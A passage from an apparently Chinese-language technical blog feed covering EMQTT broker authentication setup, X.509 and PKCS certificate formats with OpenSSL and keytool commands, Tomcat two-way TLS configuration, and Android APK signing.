class="hljs-regexp">//</span>repo.eclipse.org<span class="hljs-regexp">/content/</span>repositories<span class="hljs-regexp">/paho-releases/</span>org<span class="hljs-regexp">/eclipse/</span>paho<span class="hljs-regexp">/org.eclipse.paho.ui.app/</span><span class="hljs-number">1.0</span>.<span class="hljs-number">2</span>/<br></code></pre></td></tr></table></figure><h2 id="emqtt常用命令"><a href="#emqtt常用命令" class="headerlink" title="emqtt常用命令"></a>emqtt常用命令</h2><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>emqttd start</td><td>启动 emqtt 服务</td></tr><tr><td>emqttd stop</td><td>停止 emqtt 服务</td></tr><tr><td>emqttd restart</td><td>重启 emqtt 服务</td></tr><tr><td>emqttd_ctl status</td><td>查看 emqtt 服务状态</td></tr></tbody></table><h2 id="EMQTT安全设置"><a href="#EMQTT安全设置" class="headerlink" title="EMQTT安全设置"></a>EMQTT安全设置</h2><h3 id="用户密码认证"><a href="#用户密码认证" class="headerlink" title="用户密码认证"></a>用户密码认证</h3><p>默认情况下，emqtt 服务会启用匿名认证，也就是说连接 emqtt 的服务时，不需要任何的账号密码，就可以连接，但通常情况下，我们会对连接 emqtt 服务的账号和密码加以控制，这时我们就需要来修改 emqtt 的配置文件</p><h4 id="1-修改配置文件"><a href="#1-修改配置文件" class="headerlink" title="1. 修改配置文件"></a>1. 修改配置文件</h4><p><code>/emqtt/bin/etc/emq.conf</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//设置</span><br>mqtt.allow_anonymous=<span class="hljs-keyword">false</span><br></code></pre></td></tr></table></figure><h4 id="2-配置用户密码认证"><a href="#2-配置用户密码认证" class="headerlink" title="2. 配置用户密码认证"></a>2. 配置用户密码认证</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">vim /emqtt/emqttd/etc/plugins/emqx_auth_username.conf<br><br>auth.<span class="hljs-keyword">user</span><span class="hljs-number">.1</span>.username = <span class="hljs-keyword">admin</span> <br>auth.<span class="hljs-keyword">user</span><span class="hljs-number">.1</span>.<span class="hljs-keyword">password</span> = <span class="hljs-keyword">admin</span> <br><br>:wq<br></code></pre></td></tr></table></figure><h4 id="3-开启用户密码认证插件"><a href="#3-开启用户密码认证插件" class="headerlink" title="3. 开启用户密码认证插件"></a>3. 开启用户密码认证插件</h4><ul><li>第一种方式：emqttd_ctl plugins load emq_auth_username</li></ul><ul><li>第二种方式：在 web 管理控制台中开启该插件</li></ul><h4 id="4-重启服务"><a href="#4-重启服务" class="headerlink" title="4. 重启服务"></a>4. 重启服务</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">emqttd restart</span><br></code></pre></td></tr></table></figure><h3 id="Clientid-认证"><a href="#Clientid-认证" class="headerlink" title="Clientid 认证"></a>Clientid 认证</h3><p>编辑<code>/emqtt/emqttd/etc/plugins/emq_auth_clientid.conf</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//设置</span><br>auth.client<span class="hljs-number">.1</span>.clientid = clientid<br>auth.client<span class="hljs-number">.1</span>.password = root<br></code></pre></td></tr></table></figure><h4 id="1-开启-Clientid-认证插件"><a href="#1-开启-Clientid-认证插件" class="headerlink" title="1.开启 Clientid 认证插件"></a>1.开启 Clientid 认证插件</h4><ul><li>第一种方式：emqttd_ctl plugins load emq_auth_clientid</li></ul><ul><li>第二种方式：在 web 管理控制台中开启该插件</li></ul><h4 id="2-重启服务，使插件生效"><a href="#2-重启服务，使插件生效" class="headerlink" title="2. 重启服务，使插件生效"></a>2. 重启服务，使插件生效</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">emqttd restart</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>mqtt</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>证书体系</title>
    <link href="/2021/08/22/%E8%AF%81%E4%B9%A6%E4%BD%93%E7%B3%BB/"/>
    <url>/2021/08/22/%E8%AF%81%E4%B9%A6%E4%BD%93%E7%B3%BB/</url>
    
    <content type="html"><![CDATA[<h2 id="X509标准"><a href="#X509标准" class="headerlink" title="X509标准"></a>X509标准</h2><p>X.509 - 这是一种证书标准,主要定义了证书中应该包含哪些内容，证书主要包括颁发者和被办法者的信息,以及被颁发者的公钥，和CA机构对这些信息的认证，</p><ol><li>两种编码方式：</li></ol><ul><li><p>PEM - Privacy Enhanced Mail,打开看文本格式,以”—–BEGIN…”开头, “—–END…”结尾,内容是BASE64编码.</p><pre><code>  Apache和*NIX服务器偏向于使用这种编码格式.</code></pre></li><li><p>DER - Distinguished Encoding Rules,打开看是二进制格式,不可读.</p><p>Java和Windows服务器偏向于使用这种编码格式.</p></li></ul><ol><li>各种文件拓展名：</li></ol><ul><li>CRT - CRT应该是certificate的三个字母,其实还是证书的意思,常见于*NIX系统,有可能是PEM编码,也有可能是DER编码,大多数应该是PEM编码</li><li>CER - 还是certificate,还是证书,常见于Windows系统,同样的,可能是PEM编码,也可能是DER编码,大多数应该是DER编码.</li><li>KEY - 通常用来存放一个公钥或者私钥,<strong>并非X.509证书</strong>,编码同样的,可能是PEM,也可能是DER.</li><li>CSR - Certificate Signing Request,即证书签名请求,这个并不是证书,而是向权威证书颁发机构获得签名证书的申请,其核心内容是一个公钥(当然还附带了一些别的信息),在生成这个申请的时候,同时也会生成一个私钥</li><li>PFX/P12 - predecessor of PKCS#12,对*nix服务器来说,一般CRT和KEY是分开存放在不同文件中的,但Windows的IIS则将它们存在一个PFX文件中,(因此这个文件包含了证书及私钥)这样会不会不安全？应该不会,PFX通常会有一个”提取密码”</li></ul><blockquote><p>总结起来：crt cer约等于x509证书，key保存公钥或私钥，csr是证书签名请求，pfx包含证书和私钥</p></blockquote><h2 id="PKCS标准"><a href="#PKCS标准" class="headerlink" title="PKCS标准"></a>PKCS标准</h2><p>PKCS系列是 Public-Key Cryptography Standards ，是RSA制定的一系列的标准，注意前面的文件后缀，都不算是<strong>标准</strong>，只有X509和PKCS可以称为标准，<br>PKCS中经常使用的就是：PKCS1 PKCS8 PKCS12</p><ul><li>PEM - Privacy Enhanced Mail,打开看文本格式,以”—–BEGIN…”开头, “—–END…”结尾,内容是BASE64编码.</li></ul><p>查看PEM格式证书的信息:openssl x509 -in certificate.pem -text -noout<br>Apache和*NIX服务器偏向于使用这种编码格式.</p><ul><li><p>DER - Distinguished Encoding Rules,打开看是二进制格式,不可读.</p></li><li><p>PKCS#1：定义<strong>RSA</strong>公开密钥算法加密和签名机制，主要用于组织PKCS#7中所描述的数字签名和数字信封。</p></li><li><p>PKCS#2：涉及了RSA的消息摘要加密，这已被并入PKCS#1中。</p></li><li><p>PKCS#3：Diffie-Hellman密钥协议标准。PKCS#3描述了一种实现Diffie- Hellman密钥协议的方法。</p></li><li><p>PKCS#4：最初是规定RSA密钥语法的，现已经被包含进PKCS#1中。</p></li><li><p>PKCS#5：基于口令的加密标准。PKCS#5描述了使用由口令生成的密钥来加密8位位组串并产生一个加密的8位位组串的方法。PKCS#5可以用于加密私钥，以便于密钥的安全传输（这在PKCS#8中描述）。</p></li><li><p>PKCS#6：扩展证书语法标准。PKCS#6定义了提供附加实体信息的X.509证书属性扩展的语法（当PKCS#6第一次发布时，X.509还不支持扩展。这些扩展因此被包括在X.509中）。</p></li><li><p>PKCS#7：密码消息语法标准。PKCS#7为使用密码算法的数据规定了通用语法，比如数字签名和数字信封。PKCS#7提供了许多格式选项，包括未加密或签名的格式化消息、已封装（加密）消息、已签名消息和既经过签名又经过加密的消息。</p></li><li><p>PKCS#8：描述私有密钥信息格式，该信息包括公开密钥算法的私有密钥以及可选的属性集等。注意pkcs8不只是能表示RSA，所以比PKCS1更具有通用性</p></li><li><p>PKCS#9：可选属性类型。PKCS#9定义了PKCS#6扩展证书、PKCS#7数字签名消息、PKCS#8私钥信息和PKCS#10证书签名请求中要用到的可选属性类型。已定义的证书属性包括E-mail地址、无格式姓名、内容类型、消息摘要、签名时间、签名副本（counter signature）、质询口令字和扩展证书属性。</p></li><li><p>PKCS#10：证书请求语法标准。PKCS#10定义了证书请求的语法。证书请求包含了一个唯一识别名、公钥和可选的一组属性，它们一起被请求证书的实体签名（证书管理协议中的PKIX证书请求消息就是一个PKCS#10）。</p></li><li><p>PKCS#11：密码令牌接口标准。PKCS#11或“Cryptoki”为拥有密码信息（如加密密钥和证书）和执行密码学函数的单用户设备定义了一个应用程序接口（API）。智能卡就是实现Cryptoki的典型设备。注意：Cryptoki定义了密码函数接口，但并未指明设备具体如何实现这些函数。而且Cryptoki只说明了密码接口，并未定义对设备来说可能有用的其他接口，如访问设备的文件系统接口。</p></li><li><p>PKCS#12：描述个人信息交换语法标准。描述了将用户公钥、私钥、证书和其他相关信息打包的语法。</p></li><li><p>PDCS#13：椭圆曲线密码标准。PKCS#13标准当前正在完善之中。它包括椭圆曲线参数的生成和验证、密钥生成和验证、数字签名和公钥加密，还有密钥协定，以及参数、密钥和方案标识的ASN.1语法。</p></li><li><p>PKCS#14：伪随机数产生标准。PKCS#14标准当前正在完善之中。为什么随机数生成也需要建立自己的标准呢？PKI中用到的许多基本的密码学函数，如密钥生成和Diffie-Hellman共享密钥协商，都需要使用随机数。然而，如果“随机数”不是随机的，而是取自一个可预测的取值集合，那么密码学函数就不再是绝对安全了，因为它的取值被限于一个缩小了的值域中。因此，安全伪随机数的生成对于PKI的安全极为关键。</p></li><li><p>PKCS#15：密码令牌信息语法标准。PKCS#15通过定义令牌上存储的密码对象的通用格式来增进密码令牌的互操作性。在实现PKCS#15的设备上存储的数据对于使用该设备的所有应用程序来说都是一样的，尽管实际上在内部实现时可能所用的格式不同。PKCS#15的实现扮演了翻译家的角色，它在卡的内部格式与应用程序支持的数据格式间进行转换.</p></li></ul><blockquote><p>总结：PKCS1,8,12都可以在某些情况下当作文件格式，PKCS1描述基础的密钥格式，PKCS8也描述密钥，但格式和1不同，PKCS12等价于PFX文件，包含证书和私钥</p></blockquote><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-meta"># 生成PKCS#1的公私钥</span><br>openssl genrsa -<span class="hljs-keyword">out</span> pkcs1_private.pem <span class="hljs-number">1024</span><br>openssl rsa -<span class="hljs-keyword">in</span> pkcs1_private.pem -RSAPublicKey_out -<span class="hljs-keyword">out</span> pkcs1_public.pem<br><br>查看私钥<br> openssl rsa -<span class="hljs-keyword">in</span> rsa_private_key.pem -text -noout<br>查看公钥<br>openssl rsa -pubin -<span class="hljs-keyword">in</span>  rsa_public_key.pem  -text<br><br><span class="hljs-meta"># 由PKCS#1的私钥，生成PKCS#8的公私钥</span><br>openssl pkcs8 -topk8 -inform PEM -<span class="hljs-keyword">in</span> pkcs1_private.pem -outform PEM -nocrypt -<span class="hljs-keyword">out</span> from_pkcs1_private_to_pkcs8_private.pem<br><br>openssl rsa -<span class="hljs-keyword">in</span> pkcs1_private.pem -pubout -<span class="hljs-keyword">out</span> from_pkcs1_private_to_pkcs8_public.pem<br><br><span class="hljs-meta"># 由PKCS#8的私钥，生成PKCS#1的公私钥</span><br>openssl rsa -<span class="hljs-keyword">in</span> from_pkcs1_private_to_pkcs8_private.pem -<span class="hljs-keyword">out</span> from_pkcs8_private_to_pkcs1_private.pem<br><br>openssl rsa -<span class="hljs-keyword">in</span> from_pkcs1_private_to_pkcs8_private.pem -RSAPublicKey_out -<span class="hljs-keyword">out</span> from_pkcs8_private_to_pkcs1_public.pem<br><br><span class="hljs-meta"># 由PKCS1公钥生成PKCS#8公钥:</span><br>openssl rsa -RSAPublicKey_in -<span class="hljs-keyword">in</span> pkcs1_public.pem -pubout -<span class="hljs-keyword">out</span> from_pkcs1_public_to_pkcs8_public.pem<br><br><span class="hljs-meta"># 由PKCS8公钥生成PKCS#1公钥:</span><br>openssl rsa -pubin -<span class="hljs-keyword">in</span> from_pkcs1_private_to_pkcs8_public.pem -RSAPublicKey_out -<span class="hljs-keyword">out</span> from_pkcs8_public_to_pkcs1_public.pem<br><br>产生证书请求 注意PKCS1 <span class="hljs-number">8</span>都可以<br>openssl req -<span class="hljs-keyword">new</span> -key private_key.pem -<span class="hljs-keyword">out</span> rsaCerReq.csr<br><br>产生证书 注意PKCS1 <span class="hljs-number">8</span>都可以<br>openssl x509 -req -days <span class="hljs-number">3650</span> -<span class="hljs-keyword">in</span> rsaCerReq.csr -signkey private_key.pem -<span class="hljs-keyword">out</span> rsaCert.crt<br><br>从证书获得公钥：<br>openssl x509 -<span class="hljs-keyword">in</span> rsaCert.crt  -noout  -pubkey  &gt; public_key.pem<br><br>生成PKCS12<br>openssl pkcs12 -export -inkey serverprikey.pem -<span class="hljs-keyword">in</span> server.pem -password pass:<span class="hljs-string">&quot;123456&quot;</span> -<span class="hljs-keyword">out</span> server_nocret.pfx<br><br><br>从PKCS12获得证书和私钥<br>openssl pkcs12 -<span class="hljs-keyword">in</span> server_nocret.pfx -nocerts -nodes  -<span class="hljs-keyword">out</span> alicekey.pem<br><br>openssl pkcs12 -<span class="hljs-keyword">in</span> server_nocret.pfx  -nokeys  -<span class="hljs-keyword">out</span> cert.pem<br><br>查看pkcs12内容 -nodes:因为私钥在在输出前会输出加密结果，所以需要nodes来保证不用打密码和不加密<br>openssl pkcs12 -<span class="hljs-keyword">in</span> server_nocret.pfx -nocerts -nodes  -<span class="hljs-keyword">out</span> alicekey.pem<br></code></pre></td></tr></table></figure><h2 id="SSL常见证书"><a href="#SSL常见证书" class="headerlink" title="SSL常见证书"></a>SSL常见证书</h2><p>根据不同的服务器以及服务器的版本，我们需要用到不同的证书格式，就市面上主流的服务器来说，大概有以下格式：</p><ul><li>.DER .CER，文件是二进制格式，只保存证书，不保存私钥。</li><li>.PEM，一般是文本格式，可保存证书，可保存私钥。</li><li>.CRT，可以是二进制格式，可以是文本格式，与 .DER 格式相同，不保存私钥。</li><li>.PFX .P12，二进制格式，同时包含证书和私钥，一般有密码保护。</li><li>.JKS，二进制格式，同时包含证书和私钥，一般有密码保护。</li></ul><h3 id="DER"><a href="#DER" class="headerlink" title="DER"></a>DER</h3><p>该格式是二进制文件内容，Java 和 Windows 服务器偏向于使用这种编码格式。</p><p>OpenSSL 查看:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">openssl</span> x<span class="hljs-number">509</span> -in certificate.der -inform der -text -noout<br></code></pre></td></tr></table></figure><p>转换为 PEM：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">openssl x509 -<span class="hljs-keyword">in</span> cert.crt -inform der -outform pem -<span class="hljs-keyword">out</span> cert.pem<br></code></pre></td></tr></table></figure><h3 id="PEM"><a href="#PEM" class="headerlink" title="PEM"></a>PEM</h3><p>Privacy Enhanced Mail，一般为文本格式，以 <code>-----BEGIN...</code> 开头，以 <code>-----END...</code> 结尾。中间的内容是 BASE64 编码。这种格式可以保存证书和私钥，有时我们也把PEM 格式的私钥的后缀改为 .key 以区别证书与私钥。具体你可以看文件的内容。</p><p>这种格式常用于 Apache 和 Nginx 服务器。</p><p>OpenSSL 查看：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">openssl</span> x<span class="hljs-number">509</span> -in certificate.pem -text -noout<br></code></pre></td></tr></table></figure><p>转换为 DER：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">openssl x509 -<span class="hljs-keyword">in</span> cert.crt -outform der -<span class="hljs-keyword">out</span> cert.der<br></code></pre></td></tr></table></figure><h3 id="CRT"><a href="#CRT" class="headerlink" title="CRT"></a>CRT</h3><p>Certificate 的简称，有可能是 PEM 编码格式，也有可能是 DER 编码格式。如何查看请参考前两种格式。</p><h3 id="PFX"><a href="#PFX" class="headerlink" title="PFX"></a>PFX</h3><p>Predecessor of PKCS#12，这种格式是二进制格式，且证书和私钥存在一个 PFX 文件中。一般用于 Windows 上的 IIS 服务器。改格式的文件一般会有一个密码用于保证私钥的安全。</p><p>OpenSSL 查看：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">openssl</span> pkcs<span class="hljs-number">12</span> -in key.pfx<br></code></pre></td></tr></table></figure><p>转换为 PEM：</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">openssl pkcs12 -<span class="hljs-meta">in</span> <span class="hljs-meta">key</span>.pfx -<span class="hljs-meta">out</span> <span class="hljs-meta">key</span>.pem -nodes<br></code></pre></td></tr></table></figure><h3 id="JKS"><a href="#JKS" class="headerlink" title="JKS"></a>JKS</h3><p>Java Key Storage，很容易知道这是 JAVA 的专属格式，利用 JAVA 的一个叫 <code>keytool</code>的工具可以进行格式转换。一般用于 Tomcat 服务器。</p><p><a href="https://myssl.com/cert_convert.html">在线格式转换</a></p><h2 id="TOMCAT双向认证"><a href="#TOMCAT双向认证" class="headerlink" title="TOMCAT双向认证"></a>TOMCAT双向认证</h2><ol><li>使用keytool生成证书，成文keystore文件，ailas(别名)每个keystore都关联这一个独一无二的alias，这个alias通常不区分大小写</li></ol><p>在keystore里，包含两种数据： </p><ul><li> 密钥实体（Key entity）——密钥（secret key）又或者是私钥和配对公钥（采用非对称加密）</li><li>可信任的证书实体（trusted certificate entries）——只包含公钥</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">keytool</span> -genkey -v -alias tomcat -keyalg RSA -keystore tomcat.keystore -validity <span class="hljs-number">36500</span><br></code></pre></td></tr></table></figure><ol start="2"><li>为客户端生成证书</li></ol><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">keytool</span> -genkey -v -<span class="hljs-keyword">alias</span> mykey -keyalg <span class="hljs-type">RSA</span> -store<span class="hljs-keyword">type</span> <span class="hljs-type">PKCS12</span> -keystore mykey.p12 <br></code></pre></td></tr></table></figure><ol start="3"><li>让服务器信任客户端证书</li></ol><p>由于是双向SSL认证，服务器必须要信任客户端证书，因此，必须把客户端证书添加为服务器的信任认证。由于不能直接将PKCS12格式的证书库导入，必须先把客户端证书导出为一个单独的CER文件，使用如下命令：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">keytool</span> -export -alias mykey -keystore mykey.p<span class="hljs-number">12</span> -storetype PKCS<span class="hljs-number">12</span> -storepass <span class="hljs-number">123456</span> -rfc -file mykey.cer   //PKCS#<span class="hljs-number">12</span>转cer<br></code></pre></td></tr></table></figure><p>将该cer文件导入到服务器的证书库，添加为一个信任证书。</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">keytool</span> -<span class="hljs-keyword">import</span> -v -file mykey.cer -keystore tomcat.keystore<br></code></pre></td></tr></table></figure><p>通过list命令查看服务器的证书库，可以看到两个证书，一个是服务器证书，一个是受信任的客户端证书：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">keytool -<span class="hljs-type">list</span> -keystore tomcat.keystore<br></code></pre></td></tr></table></figure><ol start="4"><li>让客户端信任服务器证书</li></ol><p>由于是双向SSL认证，客户端也要验证服务器证书，因此，必须把服务器证书添加到浏览的“受信任的根证书颁发机构”。由于不能直接将keystore格式的证书库导入，必须先把服务器证书导出为一个单独的CER文件，使用如下命令。</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi">keytool -keystore tomcat.keystore -<span class="hljs-keyword">export</span> -<span class="hljs-keyword">alias</span> tomcat -<span class="hljs-keyword">file</span>  tomcat.cer -validity <span class="hljs-number">36500</span><br></code></pre></td></tr></table></figure><p>5.配置Tomcat服务器</p><p>打开Tomcat根目录下的/conf/server.xml，找到Connector port=”8443″配置段，修改为如下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;Connector <span class="hljs-attribute">port</span>=”8443″ <span class="hljs-attribute">protocol</span>=”org.apache.coyote.http11.Http11NioProtocol”<br><br><span class="hljs-attribute">SSLEnabled</span>=”true” <span class="hljs-attribute">maxThreads</span>=”150″ <span class="hljs-attribute">scheme</span>=”https”<br><br><span class="hljs-attribute">secure</span>=”true” <span class="hljs-attribute">clientAuth</span>=”true” <span class="hljs-attribute">sslProtocol</span>=”TLS”<br><br><span class="hljs-attribute">keystoreFile</span>=”D:\\home\\tomcat.keystore” <span class="hljs-attribute">keystorePass</span>=”123456″<br><br><span class="hljs-attribute">truststoreFile</span>=”D:\\home\\tomcat.keystore” <span class="hljs-attribute">truststorePass</span>=”123456″ /&gt;<br></code></pre></td></tr></table></figure><p>属性说明：</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">clientAuth:</span>设置是否双向验证，默认为<span class="hljs-literal">false</span>，设置为<span class="hljs-literal">true</span>代表双向验证<br><br><span class="hljs-symbol">keystoreFile:</span>服务器证书文件路径<br><br><span class="hljs-symbol">keystorePass:</span>服务器证书密码<br><br><span class="hljs-symbol">truststoreFile:</span>用来验证客户端证书的根证书，此例中就是服务器证书<br><br><span class="hljs-symbol">truststorePass:</span>根证书密码<br></code></pre></td></tr></table></figure><p>应用程序HTTP自动跳转到HTTPS(未测试)</p><p>在应用程序中web.xml中加入：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">security-constraint</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">web-resource-collection</span> &gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">web-resource-name</span> &gt;</span>SSL<span class="hljs-tag">&lt;/<span class="hljs-name">web-resource-name</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-resource-collection</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">user-data-constraint</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">transport-guarantee</span>&gt;</span>CONFIDENTIAL<span class="hljs-tag">&lt;/<span class="hljs-name">transport-guarantee</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">user-data-constraint</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">security-constraint</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="安卓签名"><a href="#安卓签名" class="headerlink" title="安卓签名"></a>安卓签名</h2><p>生成keystore文件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">keytool</span> -genkey -alias android.keystore -keyalg RSA -validity <span class="hljs-number">36500</span> -keystore android.keystore<br></code></pre></td></tr></table></figure><p>签名：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">jarsigner </span>-verbose -keystore xx.keystore  -storepass XXXXXX -signedjar <span class="hljs-keyword">android_sign.apk </span>-<span class="hljs-keyword">digestalg </span><span class="hljs-keyword">SHA1 </span>-sigalg MD5withRSA <span class="hljs-keyword">android.apk </span>别名<br><br><span class="hljs-keyword">android_sign.apk为签名后生成的apk文件</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">android.apk为源apk文件</span><br></code></pre></td></tr></table></figure><h3 id="V1和V2签名"><a href="#V1和V2签名" class="headerlink" title="V1和V2签名"></a>V1和V2签名</h3><h4 id="签名工具"><a href="#签名工具" class="headerlink" title="签名工具"></a>签名工具</h4><pre><code>    Android 应用的签名工具有两种：jarsigner 和 signAPK。它们的签名算法没什么区别，主要是签名使用的文件不同。</code></pre><ul><li>jarsigner：jdk 自带的签名工具，可以对 jar 进行签名。使用 keystore 文件进行签名。生成的签名文件默认使用 keystore 的别名命名。</li><li>signAPK：Android sdk 提供的专门用于 Android 应用的签名工具。使用 pk8、x509.pem 文件进行签名。其中 pk8 是私钥文件，x509.pem 是含有公钥的文件。生成的签名文件统一使用“CERT”命名。</li></ul><h4 id="v1签名"><a href="#v1签名" class="headerlink" title="v1签名"></a>v1签名</h4><ol><li><p>MANIFEST.MF</p><p>该文件中保存的内容其实就是逐一遍历 APK 中的所有条目，如果是目录就跳过，如果是一个文件，就用 SHA1（或者 SHA256）消息摘要算法提取出该文件的摘要然后进行 BASE64 编码后，作为“SHA1-Digest”属性的值写入到 MANIFEST.MF 文件中的一个块中。该块有一个“Name”属性， 其值就是该文件在 APK 包中的路径。</p></li><li><p>CERT.SF</p></li></ol><ul><li><p>SHA1-Digest-Manifest-Main-Attributes：对 MANIFEST.MF 头部的块做 SHA1（或者SHA256）后再用 Base64 编码</p></li><li><p>SHA1-Digest-Manifest：对整个 MANIFEST.MF 文件做 SHA1（或者 SHA256）后再用 Base64 编码</p></li><li><p>SHA1-Digest：对 MANIFEST.MF 的各个条目做 SHA1（或者 SHA256）后再用 Base64 编码</p></li></ul><ol start="3"><li><p>CERT.RSA</p><p>这里会把之前生成的 CERT.SF 文件，用私钥计算出签名, 然后将签名以及包含公钥信息的数字证书一同写入 CERT.RSA 中保存。这里要注意的是，Android APK 中的 CERT.RSA 证书是自签名的，并不需要这个证书是第三方权威机构发布或者认证的，用户可以在本地机器自行生成这个自签名证书。Android 目前不对应用证书进行 CA 认证。</p><p>CERT.RSA文件：</p></li></ol> <img src="/2021/08/22/%E8%AF%81%E4%B9%A6%E4%BD%93%E7%B3%BB/images/CERTRSA%E6%96%87%E4%BB%B6.png" class=""><h5 id="签名过程"><a href="#签名过程" class="headerlink" title="签名过程"></a>签名过程</h5> <img src="/2021/08/22/%E8%AF%81%E4%B9%A6%E4%BD%93%E7%B3%BB/images/%E7%AD%BE%E5%90%8D%E8%BF%87%E7%A8%8B.png" class=""><h5 id="签名校验过程"><a href="#签名校验过程" class="headerlink" title="签名校验过程"></a>签名校验过程</h5><p>签名验证是发生在APK的安装过程中，一共分为三步：</p><ol><li><p>检查 APK 中包含的所有文件，对应的摘要值与 MANIFEST.MF 文件中记录的值一致。</p></li><li><p>使用证书文件（RSA 文件）检验签名文件（SF 文件）没有被修改过。</p></li><li><p>使用签名文件（SF 文件）检验 MF 文件没有被修改过</p></li></ol> <img src="/2021/08/22/%E8%AF%81%E4%B9%A6%E4%BD%93%E7%B3%BB/images/%E7%AD%BE%E5%90%8D%E6%A0%A1%E9%AA%8C%E8%BF%87%E7%A8%8B.png" class=""><h4 id="V2签名"><a href="#V2签名" class="headerlink" 